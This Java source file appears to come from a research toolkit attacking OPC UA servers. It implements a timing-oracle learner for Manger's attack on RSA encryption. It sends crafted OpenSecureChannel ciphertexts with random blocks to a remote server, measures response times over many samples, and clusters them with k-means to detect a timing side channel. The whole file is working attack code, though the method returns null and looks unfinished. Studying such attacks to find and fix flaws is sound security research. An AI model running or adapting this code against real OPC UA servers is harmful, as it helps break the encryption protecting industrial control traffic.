package attacks.manger.oracle.learner;

import attacks.CipherTextHelper;
import attacks.manger.oracle.OracleException;
import opcua.context.Context;
import opcua.message.ErrorMessage;
import opcua.message.HelloMessage;
import opcua.message.Message;
import opcua.message.parts.MessageType;
import opcua.util.MessageReceiver;
import opcua.util.MessageSender;
import smile.clustering.KMeans;
import smile.plot.Palette;
import smile.plot.PlotCanvas;
import smile.plot.ScatterPlot;
import transport.tcp.ClientTcpConnection;

import javax.print.attribute.standard.OrientationRequested;
import javax.swing.*;
import java.awt.*;
import java.io.FileWriter;
import java.io.IOException;
import java.math.BigInteger;
import java.security.SecureRandom;
import java.security.interfaces.RSAPublicKey;
import java.util.*;

public class TimingOracleLearner extends OracleLearner {

    private final static int SAMPLE_SIZE = 512;
    private final Context context;
    private final byte[] validCipherText;

    public TimingOracleLearner(Context context, byte[] validCipherText) {
        this.context = context;
        this.validCipherText = validCipherText;
    }

    @Override
    public LearningResult learn(int rounds) throws OracleException {

        ClientTcpConnection connection = new ClientTcpConnection(context.getRemoteHostname(), context.getRemotePort(), 3000);
        context.setConnection(connection);

        byte[] cipherText = Arrays.copyOf(validCipherText, validCipherText.length);
        int cipherBlockLength = ((RSAPublicKey) context.getRemoteCertificate().getPublicKey()).getModulus().bitLength() / 8;
        int blockOffset;
        try {
            blockOffset = CipherTextHelper.getOpnBlockOffset(cipherText, (RSAPublicKey) context.getRemoteCertificate().getPublicKey());
        } catch (IOException e) {
            throw new OracleException("Unable to compute block offset", e);
        }
        byte[] randomCipherBlock = new byte[cipherBlockLength];
        SecureRandom secureRandom = new SecureRandom();

        double[][] times = new double[rounds][2];   //We need to save each time value as 1-dimensional vector

        /*
         * We generate all cipher blocks beforehand. Therefore we can sequentially send the same blocks and compute the
         * mean time between request and response for each block. This way we can bring down variance.
         */
        long[][] timeSamples = new long[rounds][SAMPLE_SIZE];
        byte[][] blocks = new byte[rounds][cipherBlockLength];
        for(int i = 0; i < rounds; i++) {
            //Create random cipher block and make sure it is no larger than the servers RSA-modulus
            do {
                secureRandom.nextBytes(blocks[i]);
            }
            while((new BigInteger(1, blocks[i])).compareTo(((RSAPublicKey) context.getRemoteCertificate().getPublicKey()).getModulus()) > 0);
        }

        for(int j = 0; j < SAMPLE_SIZE; j++) {
            for (int i = 0; i < rounds; i++) {
                //Insert a random cipher block into the valid cipher text
                CipherTextHelper.insertCipherBlock(cipherText, blocks[i], blockOffset, cipherBlockLength, 0);

                try {
                    connection.initialize();
                    MessageSender.sendMessage(new HelloMessage(0, 8192, 8192, 8192, 256, context.getEndpointUrl()), context);
                    Message ack = MessageReceiver.receiveMessage(context);
                    if (ack == null || ack.getMessageType() != MessageType.ACK) {
                        throw new OracleException("Unable to establish TCP connection");
                    }

                    // Constant time BEGIN
                    long pre = System.nanoTime();
                    MessageSender.sendBytes(cipherText, context);
                    Message response = MessageReceiver.receiveMessage(context);
                    long post = System.nanoTime();
                    //Constant time END

                    connection.close();

                    synchronized (this) {
                        try {
                            this.wait(3);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }

                    if (response == null || response.getMessageType() != MessageType.ERR) {
                        throw new OracleException("Invalid response");
                    }
                    timeSamples[i][j] = post - pre;



                } catch (IOException e) {
                    throw new OracleException(e);
                }
            }

            System.out.println(j);
        }

        //Calculate median of sample
        double[][] data = new double[rounds][2];    //Dimension of 2 needed for plot
        for(int i = 0; i < rounds; i++) {
            Arrays.sort(timeSamples[i]);
            /*
            if(SAMPLE_SIZE % 2 == 0) {
                data[i][0] = ((double)(timeSamples[i][SAMPLE_SIZE/2 - 1] + timeSamples[i][SAMPLE_SIZE/2]))/2;
            } else {
                data[i][0] = (double)timeSamples[i][SAMPLE_SIZE/2];
            }
            */


            long sum = 0;
            for(int j = SAMPLE_SIZE /4; j < 3*SAMPLE_SIZE/4; j++) {
                sum += timeSamples[i][j];
            }
            data[i][0] = ((double)sum)/(SAMPLE_SIZE/2);


        }

        KMeans kMeans = new KMeans(data, 2, 1000, 1000);

        PlotCanvas plot = ScatterPlot.plot(data, kMeans.getClusterLabel(), 'x', Palette.COLORS);
        plot.points(kMeans.centroids(), '@');

        JFrame f = new JFrame("K-Means");
        f.setSize(new Dimension(1920, 1080));
        f.setLocationRelativeTo( null );
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.getContentPane().add(plot);
        f.setVisible(true);

        return null;
    }
}
